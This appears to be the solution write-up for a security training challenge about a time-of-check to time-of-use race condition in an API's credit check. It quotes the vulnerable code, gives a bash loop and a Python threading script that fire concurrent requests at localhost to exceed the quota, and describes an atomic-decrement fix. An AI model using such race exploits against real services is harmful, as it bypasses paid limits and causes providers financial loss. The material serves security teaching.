# Challenge-01 — Solution

## Issue Summary

The service attempts to enforce usage limits by checking whether a user has available credits before allowing an action. While the logic appears correct at a glance, the enforcement relies on assumptions about request sequencing and previously validated state.

The system assumes that once credit availability is checked, the state remains valid until the action is performed.

## Root Cause

The core issue lies in the separation of **Eligibility checking** and **Credit consumption**, creating a Time-of-Check to Time-of-Use (TOCTOU) vulnerability.

The endpoint first verifies the user has credits, then performs the action, and finally consumes the credit. Because state changes (consumption) happen *after* the check and the action, multiple requests can pass the check simultaneously before the first one updates the state.

**Vulnerable Code in `src/app.py`:**

```python
35:     if not has_available_credits(user.user_id):
36:         raise HTTPException(status_code=403, detail="No remaining credits")
37: 
38:     # Perform the protected action
39:     result = {
40:         "status": "action completed",
41:         "user": user.user_id
42:     }
43: 
44:     consume_credit(user.user_id)
```

The gap between line 35 (Check) and line 44 (Update) allows for a race condition.

## Impact

A user can exceed their intended usage quota by exploiting request concurrency (Race Condition). By sending multiple requests simultaneously:
1.  All requests pass the `has_available_credits` check (line 35) because the credit hasn't been deducted yet.
2.  All requests proceed to perform the action.
3.  Credits are consumed one by one, potentially driving the balance negative, but the actions have already been performed.

In a real SaaS environment, this leads to:
- Overuse of paid resources.
- Bypassing subscription limits.
- Financial loss for the service provider.

## Exploit Proof of Concept

This vulnerability is exploited not by a malformed payload, but by **timing**. An attacker sends multiple valid requests simultaneously to race against the credit deduction.

**Bash One-Liner:**
Execute this in a terminal to send 10 concurrent requests. Even with only 1 credit remaining, multiple requests will succeed.

```bash
# Send 10 requests in parallel using background jobs (&)
for i in {1..10}; do 
  curl -H "x-user-id: user-123" http://localhost:8000/perform-action & 
done
```

**Python Exploit Snippet:**
Using threads to ensure tight synchronization:

```python
import threading
import requests

def attack():
    requests.get("http://localhost:8000/perform-action", headers={"x-user-id": "user-123"})

# Launch 10 threads at once
threads = [threading.Thread(target=attack) for _ in range(10)]
for t in threads: t.start()
for t in threads: t.join()
```

## Remediation

Quota enforcement should be **atomic**. The check and the consumption must happen as a single, indivisible operation.

**Recommended Fix:**
Attempt to consume the credit first. Only if the consumption is successful (and the balance was sufficient) should the action be performed.

**Conceptual Fix:**
Instead of:
`Check -> Act -> Consume`

Use:
`Consume (atomic decrement) -> Act (if consumption successful)`

This ensures the action is only authorized if valid payment (credit) has been secured.
